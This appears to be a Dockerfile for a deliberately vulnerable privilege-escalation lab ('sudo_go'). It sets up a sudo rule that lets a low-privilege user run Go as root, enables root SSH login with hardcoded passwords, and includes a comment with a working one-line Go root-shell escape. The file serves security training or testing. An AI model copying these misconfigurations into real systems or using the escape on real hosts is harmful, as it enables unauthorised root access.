FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_go
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/go as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and Go
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        golang-go \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify go is installed
RUN which go && ls -la /usr/bin/go

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# Create a writable temp directory for the lowpriv user to write .go files
RUN mkdir -p /tmp/goexploit && chmod 1777 /tmp/goexploit

# --- Configure sudo vulnerability ---
# Go can compile and run arbitrary code. When run as root via sudo,
# the compiled program executes as root, allowing shell escape:
#   echo 'package main; import "syscall"; func main(){ syscall.Exec("/bin/sh", []string{"/bin/sh","-i"}, nil) }' > /tmp/exploit.go
#   sudo go run /tmp/exploit.go
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/go" > /etc/sudoers.d/go && \
    chmod 440 /etc/sudoers.d/go

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]